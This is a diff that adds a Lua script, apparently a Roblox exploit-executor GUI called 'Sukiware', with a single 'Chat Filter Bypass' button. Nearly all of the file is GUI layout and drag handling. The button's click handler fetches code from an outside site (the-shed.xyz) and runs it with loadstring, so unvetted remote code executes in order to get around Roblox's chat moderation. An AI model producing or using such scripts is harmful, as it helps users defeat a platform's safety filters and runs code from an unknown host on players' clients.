@@ -1,0 +1,177 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Pattern = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local Button = Instance.new("TextButton")
+local Shadow = Instance.new("Frame")
+local TextLabel_2 = Instance.new("TextLabel")
+local keyboard = Instance.new("ImageButton")
+local warning = Instance.new("ImageButton")
+local warning_2 = Instance.new("ImageButton")
+
+--Properties:
+
+ScreenGui.Archivable = false
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Archivable = false
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+Frame.Position = UDim2.new(0.541436493, 0, 0.285869569, 0)
+Frame.Size = UDim2.new(0, 388, 0, 277)
+
+Pattern.Archivable = false
+Pattern.Name = "Pattern"
+Pattern.Parent = Frame
+Pattern.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Pattern.BackgroundTransparency = 1.000
+Pattern.Size = UDim2.new(0, 388, 0, 275)
+Pattern.ZIndex = 9
+Pattern.Image = "rbxassetid://2151741365"
+Pattern.ImageTransparency = 0.600
+Pattern.ScaleType = Enum.ScaleType.Tile
+Pattern.SliceCenter = Rect.new(0, 256, 0, 256)
+Pattern.TileSize = UDim2.new(0, 250, 0, 250)
+
+TextLabel.Archivable = false
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+TextLabel.BorderColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel.Size = UDim2.new(0, 387, 0, 50)
+TextLabel.ZIndex = 9
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Sukiware"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 45.000
+
+Button.Name = "Button"
+Button.Parent = Frame
+Button.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
+Button.BorderSizePixel = 0
+Button.Position = UDim2.new(0.268041253, 0, 0.413357407, 0)
+Button.Size = UDim2.new(0, 180, 0, 45)
+Button.ZIndex = 9
+Button.Font = Enum.Font.GothamSemibold
+Button.Text = ""
+Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+Button.TextScaled = true
+Button.TextSize = 14.000
+Button.TextWrapped = true
+
+Shadow.Name = "Shadow"
+Shadow.Parent = Button
+Shadow.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+Shadow.BorderSizePixel = 0
+Shadow.Size = UDim2.new(1, 0, 1, 4)
+Shadow.ZIndex = 8
+
+TextLabel_2.Parent = Button
+TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextLabel_2.Size = UDim2.new(1, -20, 1, -20)
+TextLabel_2.ZIndex = 9
+TextLabel_2.Font = Enum.Font.GothamSemibold
+TextLabel_2.Text = "Chat Filter Bypass"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+keyboard.Name = "keyboard"
+keyboard.Parent = Frame
+keyboard.BackgroundTransparency = 1.000
+keyboard.LayoutOrder = 1
+keyboard.Position = UDim2.new(0.778350532, 0, 0.44945848, 0)
+keyboard.Size = UDim2.new(0, 25, 0, 25)
+keyboard.ZIndex = 9
+keyboard.Image = "rbxassetid://3926305904"
+keyboard.ImageRectOffset = Vector2.new(724, 444)
+keyboard.ImageRectSize = Vector2.new(36, 36)
+
+warning.Name = "warning"
+warning.Parent = Frame
+warning.BackgroundTransparency = 1.000
+warning.LayoutOrder = 1
+warning.Position = UDim2.new(0.203608245, 0, 0.0451263487, 0)
+warning.Size = UDim2.new(0, 25, 0, 25)
+warning.ZIndex = 9
+warning.Image = "rbxassetid://3926305904"
+warning.ImageRectOffset = Vector2.new(364, 324)
+warning.ImageRectSize = Vector2.new(36, 36)
+
+warning_2.Name = "warning"
+warning_2.Parent = Frame
+warning_2.BackgroundTransparency = 1.000
+warning_2.LayoutOrder = 1
+warning_2.Position = UDim2.new(0.731958747, 0, 0.0451263487, 0)
+warning_2.Size = UDim2.new(0, 25, 0, 25)
+warning_2.ZIndex = 9
+warning_2.Image = "rbxassetid://3926305904"
+warning_2.ImageRectOffset = Vector2.new(364, 324)
+warning_2.ImageRectSize = Vector2.new(36, 36)
+
+-- Scripts:
+
+local function CAJDRLZ_fake_script() -- Frame.DraggableGUI 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			if gui.Visible then
+				update(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(CAJDRLZ_fake_script)()
+local function PLUZ_fake_script() -- Button.LocalScript 
+	local script = Instance.new('LocalScript', Button)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
+	end)
+end
+coroutine.wrap(PLUZ_fake_script)()
